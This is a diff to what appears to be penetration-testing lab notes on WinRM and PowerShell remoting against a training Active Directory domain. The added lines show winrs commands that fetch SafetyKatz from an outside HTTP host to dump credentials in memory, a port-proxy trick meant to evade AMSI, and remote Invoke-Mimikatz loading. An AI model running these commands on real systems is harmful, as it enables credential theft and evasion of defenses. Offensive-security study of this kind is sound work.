@@ -7,6 +7,8 @@ WinRM Ports:
 * **5985/tcp (HTTP)**
 * **5986/tcp (HTTPS)**
 
+Use [PSReadline ](https://github.com/PowerShell/PSReadLine)script to store commands from PowerShell into a clear-text file.
+
 ## Enumeration
 
 Find machines with PS Session
@@ -40,8 +42,6 @@ Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
 Enter-PSSession -Session $sess
 ```
 
-
-
 ## Invoke-Command
 
 <pre class="language-powershell"><code class="lang-powershell"># test remoting connection
@@ -55,8 +55,8 @@ Invoke-Command -Session $Session -FilePath -ScriptBlock ${Function:Test-Function
 # Load script
 Invoke-Command -FilePath 'C:\Tools\Invoke-Mimikatz.ps1' -Session $Session
 <strong>Invoke-Command -Computername Srv01.Security.local -FilePath 'C:\Tools\Invoke-Mimikatz.ps1'
-</strong><strong>
-</strong><strong># Multiple connections
+</strong>
+<strong># Multiple connections
 </strong><strong>Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content &#x3C;list_of_servers>) 
 </strong></code></pre>
 
@@ -95,3 +95,18 @@ winrs -r:dcorp-mgmt 'whoami & hostname'
 winrs -r:server1 -u:server1\administrator -p:Pass@1234 'hostname' # With creds
 ```
 
+To run any APT tools to the victim machines. It's advised not to store the file as it will be detected by the ASMI. Directly load it into the memory to run it.
+
+```powershell
+# Will be detected by ASMI
+winrs -r:dcorp-mgmt "cmd /c <remote_file_path> -path HTTP://<ip>/SafetyKatz.exe sekurlsa::evasive-keys exit"
+```
+
+Check [transfer-files.md](../misc/transfer-files.md "mention") to get to know more about transfering the files. Use winrs like below to evade ASMI.
+
+```powershell
+# Setup proxy
+$null | winrs -r:dcorp-mgmt “netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1”
+# Transfer files
+$null | winrs -r:dcorp-mgmt “cmd /c <path_to_store> -path HTTP://<ip>/SafetyKatz.exe sekurlsa::evasive-keys exit”
+```
